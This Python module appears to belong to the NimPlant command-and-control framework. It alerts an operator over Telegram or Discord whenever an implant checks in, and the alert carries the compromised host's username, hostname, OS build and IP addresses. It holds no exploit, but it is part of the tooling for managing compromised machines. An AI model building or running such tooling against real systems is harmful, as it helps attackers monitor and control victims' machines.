import os
import requests
import urllib.parse
import json

# This is a placeholder class for easy extensibility, more than anything
# You can easily add your own notification method below, and call it in the 'notify_user' function
# It will then be called when a new implant checks in, passing the NimPlant object (see nimplant.py)

def notify_user(np):
    try:
        message = (
            "*A new NimPlant checked in!*\n\n"
            f"```\nUsername: {np.username}\n"
            f"Hostname: {np.hostname}\n"
            f"OS build: {np.osBuild}\n"
            f"External IP: {np.ipAddrExt}\n"
            f"Internal IP: {np.ipAddrInt}\n```"
        )

        # Check for Telegram credentials
        if (
            os.getenv("TELEGRAM_CHAT_ID") is not None
            and os.getenv("TELEGRAM_BOT_TOKEN") is not None
        ):
            # Telegram notification
            notify_telegram(
                message, os.getenv("TELEGRAM_CHAT_ID"), os.getenv("TELEGRAM_BOT_TOKEN")
            )

        # Check for Discord webhook URL
        if (
            os.getenv("DISCORD_WEBHOOK_URL") is not None
        ):
            # Telegram notification
            notify_discord(
                message, os.getenv("DISCORD_WEBHOOK_URL")
            )

        else:
            # No relevant environment variables set, do not notify
            pass

    except Exception as e:
        print(f"An exception occurred while trying to send a notification: {e}")


def notify_telegram(message, telegram_chat_id, telegram_bot_token):
    message = urllib.parse.quote(message)
    notification_request = (
        "https://api.telegram.org/bot"
        + telegram_bot_token
        + "/sendMessage?chat_id="
        + telegram_chat_id
        + "&parse_mode=Markdown&text="
        + message
    )
    response = requests.get(notification_request)
    return response.json()

def notify_discord(message, discord_webhook_url):
    data = {
        "content": message,
        "username": "Capitain NimPlant"  # You can customize the bot's name here
    }
    headers = {
        "Content-Type": "application/json"
    }
    # Performing the POST request to the Discord webhook
    response = requests.post(discord_webhook_url, data=json.dumps(data), headers=headers)
    return response.json()